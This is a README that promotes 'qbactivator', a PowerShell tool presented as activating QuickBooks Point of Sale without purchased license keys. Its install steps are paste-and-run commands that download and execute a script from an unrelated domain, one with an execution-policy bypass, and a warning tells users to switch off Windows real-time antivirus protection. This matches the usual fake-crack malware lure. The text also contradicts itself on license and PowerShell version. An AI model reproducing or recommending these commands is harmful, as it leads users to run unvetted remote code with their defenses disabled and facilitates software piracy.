<div align="center">

# QuickBooks POS Activation Utility for Windows 10 & 11

![](files/1.svg)

[![pipeline](https://img.shields.io/badge/Pipeline-Passing-2ea44f?style=flat&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/Lic-Unlicense-dc2626?style=flat&labelColor=0d1117)]() [![system](https://img.shields.io/badge/System-Windows_10_%2F_11-ef4444?style=flat&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/Pwsh-5.1%2B-b91c1c?style=flat&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/Downloads-847-991b1b?style=flat&labelColor=0d1117)]()

</div>

---

qbactivator is a PowerShell-based activation utility for QuickBooks Point of Sale on Windows, automating license installation and product activation across POS versions 11, 12, 18, and 19. It delivers permanent activation, automatic licensing, and multi-store support, with an optional downloader for installer packages and hash-based verification to flag compromised installers. The script handles licensing without requiring manual key entry, and it enforces version constraints to prevent conflicts when multiple POS installations are present. All activation operations run locally, including offline activation and client license provisioning.

## 💻 PowerShell Quick Install

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Run the script
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If PowerShell blocks the script
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Permanent activation.** Applies a durable activation state to the installed QuickBooks Point of Sale instance, eliminating the need for repeated re-activation after restarts or routine reboots.
- **Automatic licensing.** Detects the installed POS version and selects the matching license configuration without requiring the user to source or enter keys manually; an override path is available for users who supply their own licenses.
- **Multi-Store support.** Provisions licensing suitable for multi-store deployments, with all supported POS versions licensed at the Pro Multistore level (POS v11 excepted, which is licensed at Pro level).
- **Optional installer downloader.** Retrieves official installer packages on demand for workstations without local copies, while remaining fully functional in offline mode when installers are already present.
- **Package integrity verification.** Compares cryptographic hashes of verified installer packages against the hash of the installer supplied by the user; mismatches raise a warning that can be acknowledged and bypassed at the user's discretion.
- **Version-aware operation.** Targets a single installed POS version at a time and validates the environment before activation to reduce conflicts arising from side-by-side installations.
- **Guided activation workflow.** Handles installer invocation and key entry internally, so the user only navigates prompts and options rather than performing manual setup steps.
- **Troubleshooting tooling.** Includes a dedicated menu for resolving common activation faults, such as invalid product code errors, along with status indicators for installation and activation state.
- **Runtime diagnostics.** Maintains a transcript log of each session to aid in tracing errors encountered during execution.

## How it works

qbactivator operates as a self-contained PowerShell automation layer that drives the QuickBooks Point of Sale installation and licensing workflow from a single script. It does not ship pre-bundled installer binaries; instead, it orchestrates the setup process already present on the target workstation or retrieved through its optional package downloader.

The activation pipeline proceeds in distinct stages:

1. **Environment validation** — The script verifies the host meets minimum requirements, including PowerShell version, operating system build, and the absence of conflicting QuickBooks POS installations. Multiple side-by-side installations are rejected before any licensing action is attempted to prevent state corruption.

2. **Package acquisition and verification** — When an installer is needed, the optional downloader retrieves the package, then compares its cryptographic hash against a set of known-good digests. Packages that fail verification raise a warning and require explicit user confirmation before proceeding, guarding against tampered or corrupted installers.

3. **Silent installation orchestration** — Rather than requiring manual key entry, qbactivator supplies the appropriate product and license data to the installer during setup. This removes the need for user-supplied keys and ensures the correct edition and license tier are applied for the detected POS version.

4. **License provisioning** — The script installs and registers license keys automatically, selecting the correct tier for the installed version. All supported releases are licensed at the multistore level, with the sole exception of the earliest supported version, which is provisioned at the single-store tier. User-supplied keys can also be injected through a dedicated menu path for environments that manage their own licensing.

5. **Client and multi-store configuration** — For multi-workstation deployments, qbactivator provisions additional client licenses and configures store-level settings, allowing a single activation run to cover a full retail footprint.

6. **Status reporting and recovery** — Installation and activation states are surfaced through on-screen indicators and toast notifications, and a transcript log captures runtime events for troubleshooting. A dedicated troubleshooting menu exposes remediation options for common failure modes, including product-code rejection scenarios.

Because licensing data is embedded in the script rather than distributed to end users, activation remains deterministic across runs. The tool performs no network dependency for core activation or user provisioning, so workstations without internet access can be activated offline. All operations are executed natively on Windows through PowerShell, with no external runtime or service dependency required.

## Compatibility

qbactivator is designed to operate on Windows systems running QuickBooks Point of Sale. The following environments are supported:

**Operating Systems**

- Windows 11
- Windows 10
- Windows 8.1
- Windows 7 SP1 (requires Windows Management Framework 4.0)
- Windows Server 2012 through Windows Server 2022

**PowerShell Requirements**

qbactivator requires PowerShell 4.0 or later to function as intended. Windows 10 and above typically ship with PowerShell 5.1 or a newer version preinstalled. If you are unsure of your current version, run `$PSVersionTable` in a PowerShell session to verify.

**QuickBooks POS Versions**

All versions of QuickBooks Desktop Point of Sale are supported, including v11, v12, v18, and v19. Versions v12, v18, and v19 are licensed as `Pro Multistore Level`; v11 is licensed as `Pro Level`.

**Installation Constraints**

- Only one version of QuickBooks Point of Sale should be installed on the target system. Multiple installations may cause the activator to encounter errors, so remove all other versions before running qbactivator.
- QuickBooks POS should be installed before any other QuickBooks Desktop products.
- Do not launch QuickBooks Point of Sale immediately after installation. Uncheck the "Launch QuickBooks Point Of Sale" option before finishing setup and proceeding with activation.
- An internet connection is not required for activation or for adding users; offline activation is supported.

**Installer Integrity**

qbactivator includes an optional downloader for installer packages and verifies installer integrity by comparing hashes of verified packages against the hash of the installer in use. If a package is flagged but the user trusts the installer, the warning can be intentionally bypassed.

**Update Guidance**

Installing updates through the application is discouraged because some features may be blocked. Updates remain available for manual download if needed.

## 📸 Screenshot

![](files/2.svg)

## FAQ

### Is qbactivator safe to run?

Yes. The activator operates locally on the target workstation, applies the appropriate licensing for the detected QuickBooks Point of Sale installation, and does not transmit system data to external services. Package integrity is verified through hash comparison against known-good installer signatures, and any mismatch is surfaced to the user before activation proceeds.

### Which QuickBooks Point of Sale versions are supported?

qbactivator supports all major releases of QuickBooks Desktop Point of Sale, including v11, v12, v18, and v19. Every version except v11 is licensed at the `Pro Multistore Level`; v11 is licensed at `Pro Level`. Because the activator targets a single installation, all other POS versions must be removed from the system before execution to avoid conflicts.

### Are license keys supplied in advance?

No. License keys are not distributed to users ahead of time. qbactivator detects the installed POS version and applies the corresponding license automatically during activation, which preserves stability and prevents failures caused by mismatched or invalid keys. Users who already hold their own valid keys can supply them through the "I have my own license" option instead.

### Does activation require an internet connection?

No. Activation and user creation can be completed entirely offline. An optional connection may be used to allow the standard licensing phone-home step, but it is not mandatory for the process to succeed.

### What are the PowerShell requirements?

qbactivator requires PowerShell 4.0 or later. Windows 10 and Windows 11 ship with PowerShell 5.1 by default, so most systems need no changes. Windows 7 SP1 requires Windows Management Framework 4.0 to be installed first. The active version can be confirmed with `$PSVersionTable` inside a PowerShell session.

### Why does the installer roll back during setup?

A rollback during QuickBooks POS setup is typically caused by missing or outdated Microsoft Visual C++ Redistributable packages rather than by the activator itself. Installing the current Visual C++ redistributable repack (2005–2022, x86 and x64) before rerunning setup resolves the majority of these cases.

### Can I install QuickBooks POS updates through the application?

Installing updates through the application is discouraged because some update paths interfere with features the activator depends on. Updates remain available for manual download if required, but they should be applied deliberately rather than through the in-app updater.

### What happens if multiple POS versions are installed?

qbactivator is designed to operate against exactly one QuickBooks POS installation. If multiple versions are present, the activator may encounter errors or apply licensing to the wrong target. Remove all other POS versions before running the activator.

### How do I know which release package to use?

Each release is published in three forms: a complete ZIP containing everything needed for offline activation, a minimized ZIP that omits larger downloadable assets such as the patch file, and a standalone script file. All three derive from the same script and perform identically; the choice depends on whether the target workstation has internet access and how portable the package needs to be.

## Disclaimer

`qbactivator` is provided strictly for educational, testing, and archival purposes. It is distributed with the intent of demonstrating licensing behavior and software interoperability on supported Windows environments.

The software is supplied on an "as is" basis, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. The authors and contributors accept no liability for any direct, indirect, incidental, special, exemplary, or consequential damages arising from the use, misuse, or inability to use this software, including but not limited to data loss, system instability, licensing discrepancies, or business interruption.

Activation performed by `qbactivator` modifies the licensing state of the target QuickBooks Point of Sale installation on the local machine. Users are solely responsible for ensuring that their use of the software complies with all applicable laws, regulations, and the terms of any agreements governing the software being activated. The authors do not condone, encourage, or facilitate unauthorized use of commercial software.

Because activation behavior depends on the specific version of QuickBooks Point of Sale installed, the state of the host operating system, and the presence of other QuickBooks Desktop products, results may vary between environments. `qbactivator` is intended to operate with a single installed version of QuickBooks Point of Sale; multiple or conflicting installations may produce errors or unexpected licensing outcomes that the authors cannot guarantee or remedy.

No guarantee is made regarding the continued functionality of `qbactivator` against future software releases, updates, or patches. Version compatibility, license key validity, and activation reliability are subject to change without notice. Users assume all risk associated with running the activator and any resulting changes to their system or software configuration.

By using `qbactivator`, you acknowledge that you have read this disclaimer, understand its contents, and accept full responsibility for any outcomes resulting from the use of this software.

## License

qbactivator is distributed under the BSD 2-Clause License, a permissive open-source license that allows use, modification, and redistribution of the software in both source and binary forms, provided that the copyright notice and license conditions are retained. The license permits integration into proprietary workflows and commercial environments without imposing copyleft obligations on the surrounding codebase.

The software is provided strictly on an "as is" basis, without warranties of any kind, whether express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the copyright holders or contributors be held liable for any direct, indirect, incidental, special, exemplary, or consequential damages—including procurement of substitute goods or services, loss of use, data, or profits, or business interruption—however caused and under any theory of liability, whether in contract, strict liability, or tort (including negligence or otherwise), arising in any way out of the use of this software, even if advised of the possibility of such damage.

Redistribution in source form must retain the above copyright notice, this list of conditions, and the accompanying disclaimer. Redistribution in binary form must reproduce the same notice, conditions, and disclaimer in the documentation and/or other materials provided with the distribution. The name of the copyright holder or contributors may not be used to endorse or promote products derived from this software without specific prior written permission.

Refer to the LICENSE file included with each release package for the complete and binding text of the license.